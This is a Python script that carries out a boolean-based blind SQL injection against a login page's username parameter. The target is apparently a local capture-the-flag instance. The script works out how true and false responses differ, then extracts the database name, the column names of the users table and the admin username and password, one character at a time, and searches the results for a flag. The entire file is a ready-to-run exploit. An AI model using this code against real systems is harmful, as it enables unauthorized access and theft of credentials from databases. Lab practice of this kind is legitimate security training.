import requests
import string

target = "http://127.0.0.1:32895/index.php"

# Global variables for detection logic
USE_LENGTH = None
TRUE_LENGTH = None
TRUE_HAS_ADMIN_MSG = None

def test_condition(condition):
    """Test if a SQL condition is true by checking response"""
    payload = f"admin' AND {condition}-- -"
    params = {'username': payload, 'password': 'x'}
    try:
        resp = requests.get(target, params=params, timeout=10)
        return resp.text, resp.status_code
    except Exception as e:
        return str(e), 0

# First, let's understand what "true" and "false" conditions look like
print("[*] Testing baseline responses...")

# Known true condition
true_resp, true_code = test_condition("1=1")
print(f"\n[TRUE CONDITION] 1=1")
print(f"Status: {true_code}")
print(f"Response length: {len(true_resp)}")
print(f"Response snippet: {true_resp[:200]}")

# Known false condition
false_resp, false_code = test_condition("1=0")
print(f"\n[FALSE CONDITION] 1=0")
print(f"Status: {false_code}")
print(f"Response length: {len(false_resp)}")
print(f"Response snippet: {false_resp[:200]}")

# Determine the distinguishing feature
if len(true_resp) != len(false_resp):
    print(f"\n[+] Can distinguish by response length: True={len(true_resp)}, False={len(false_resp)}")
    USE_LENGTH = True
    TRUE_LENGTH = len(true_resp)
    TRUE_HAS_ADMIN_MSG = False
elif "not the admin" in true_resp and "not the admin" not in false_resp:
    print(f"\n[+] Can distinguish by 'not the admin' message: True has it, False doesn't")
    USE_LENGTH = False
    TRUE_HAS_ADMIN_MSG = True
elif "not the admin" not in true_resp and "not the admin" in false_resp:
    print(f"\n[+] Can distinguish by 'not the admin' message: False has it, True doesn't")
    USE_LENGTH = False
    TRUE_HAS_ADMIN_MSG = False
else:
    print("\n[-] Cannot find clear distinguishing feature")
    print(f"True response:\n{true_resp}\n")
    print(f"False response:\n{false_resp}\n")

def is_true(condition):
    """Check if a SQL condition evaluates to true"""
    resp, code = test_condition(condition)
    if USE_LENGTH:
        return len(resp) == TRUE_LENGTH
    else:
        # The correct response for valid login is "not the admin"
        has_msg = "not the admin" in resp
        return has_msg == TRUE_HAS_ADMIN_MSG

# Verify our detection works
print("\n[*] Verifying detection logic...")
test1 = is_true("1=1")
test2 = is_true("1=0")
print(f"1=1 returns: {test1} (should be True)")
print(f"1=0 returns: {test2} (should be False)")

if test1 == True and test2 == False:
    print("[+] Detection logic is working correctly!")
else:
    print("[-] Detection logic is not working correctly, stopping")
    exit(1)

# Now extract data properly
print("\n[*] Extracting database name...")
db_name = ""
for pos in range(1, 30):
    found = False
    for char in string.ascii_lowercase + string.digits + '_':
        if is_true(f"SUBSTR(DATABASE(),{pos},1)='{char}'"):
            db_name += char
            print(f"  Pos {pos}: '{char}' -> {db_name}")
            found = True
            break
    if not found:
        break

print(f"\n[+] Database name: {db_name}")

# Extract column names from users table
print("\n[*] Extracting column names from users table...")
columns = []
for col_num in range(10):
    col_name = ""
    for pos in range(1, 30):
        found = False
        for char in string.ascii_lowercase + string.digits + '_':
            if is_true(f"SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' LIMIT {col_num},1),{pos},1)='{char}'"):
                col_name += char
                found = True
                break
        if not found:
            break
    if col_name:
        columns.append(col_name)
        print(f"  [+] Column {col_num+1}: {col_name}")
    else:
        break

print(f"\n[+] Found {len(columns)} columns: {columns}")

# Find admin user
admin_field = None
for field in ['is_admin', 'admin', 'isadmin', 'role']:
    if is_true(f"(SELECT COUNT(*) FROM users WHERE {field}=1)>0"):
        admin_field = field
        print(f"\n[+] Found admin field: {admin_field}")
        break

if admin_field:
    # Extract admin username
    print(f"\n[*] Extracting admin username...")
    admin_username = ""
    for pos in range(1, 50):
        found = False
        for char in string.ascii_lowercase + string.digits + string.ascii_uppercase + '_-@.':
            if is_true(f"SUBSTR((SELECT username FROM users WHERE {admin_field}=1 LIMIT 0,1),{pos},1)='{char}'"):
                admin_username += char
                print(f"  Pos {pos}: '{char}'")
                found = True
                break
        if not found:
            break
    
    print(f"\n[+++] ADMIN USERNAME: {admin_username}")
    
    # Extract admin password
    print(f"\n[*] Extracting admin password...")
    admin_password = ""
    charset = string.ascii_lowercase + string.digits + string.ascii_uppercase + string.punctuation
    for pos in range(1, 80):
        found = False
        for char in charset:
            if char == "'":
                # Use CHAR(39) for single quote
                if is_true(f"SUBSTR((SELECT password FROM users WHERE {admin_field}=1 LIMIT 0,1),{pos},1)=CHAR(39)"):
                    admin_password += char
                    print(f"  Pos {pos}: '{char}'")
                    found = True
                    break
            else:
                if is_true(f"SUBSTR((SELECT password FROM users WHERE {admin_field}=1 LIMIT 0,1),{pos},1)='{char}'"):
                    admin_password += char
                    print(f"  Pos {pos}: '{char}'")
                    found = True
                    break
        if not found:
            break
    
    print(f"\n[+++] ADMIN PASSWORD: {admin_password}")

# Check for flags
import re
all_data = f"{db_name} {' '.join(columns)} {admin_username if admin_field else ''} {admin_password if admin_field else ''}"
flags = re.findall(r'FLAG\{[^}]+\}', all_data)
if flags:
    for flag in flags:
        print(f"\n[!!!] FLAG FOUND: {flag}")

print("\n[*] Extraction complete!")

